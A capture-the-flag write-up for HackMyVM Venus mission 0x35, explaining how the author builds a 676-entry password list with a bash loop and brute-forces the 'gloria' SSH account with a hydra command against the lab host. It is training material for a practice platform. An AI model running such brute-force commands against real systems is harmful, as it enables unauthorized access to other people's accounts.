Mission 0x35:
The user gloria has forgotten the last 2 characters of her password ... They only remember that they were 2 lowercase letters.

Soln:

-> This is another typical case of bash scripting and using brute force method with 'hydra'.
-> They have given us the password for 'gloria' user but it is missing the last 2 letters. Given in the question that the last two letters are 2 lowercase letters.

-> Therefore we need to try all possible combinations of the 2 lowercase letters which comes down to 676 (26x26) combinations.
-> Let's start with the basics. Try to print the all possible combinations of 2 lowercase letters in bash.

# ┌──(amogha㉿Amogha)-[~]
# └─$ echo {a..z}{a..z}
# aa ab ac ad ae af ag ah .. zx zy zz

-> The above command will print all the combinations in a single line.
-> We need to print the same but at the end of the password in a sepearte line of its own as shown below.

# v7xUVE2e5bjUcaa
# v7xUVE2e5bjUcab
# v7xUVE2e5bjUcac
# ....

-> To do so we need to run a for loop and then add the given incomplete password with it as well. 

# ┌──(amogha㉿Amogha)-[~/hackmyvm_venus/maia]
# └─$ for i in {a..z}{a..z}; do echo "v7xUVE2e5bjUc$i";done>brute_force

-> In the active directory of the 'maia' user there is a file called 'forget' which contains the incomplete password. Hence I got the string "v7xUVE2e5bjUc??" out of it. Remove those 2 question marks and use it as shown above in the command.

-> We have got ourselves a file called 'brute_force' containing 676 lines of possible combinations of passwords to try from. Now it is straight forwards from here on.

*Note: I have done the above operations in my local machine so that I can use the 'hydra' application to brute force the user password.

-> Now using the same command of 'hydra' to start the brute force.

# ┌──(amogha㉿Amogha)-[~/hackmyvm_venus/maia]
# └─$ hydra -s 5000 -l gloria -P brute_force venus.hackmyvm.eu ssh
# Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-28 23:15:20

-> There you go we have got the password that we wanted.
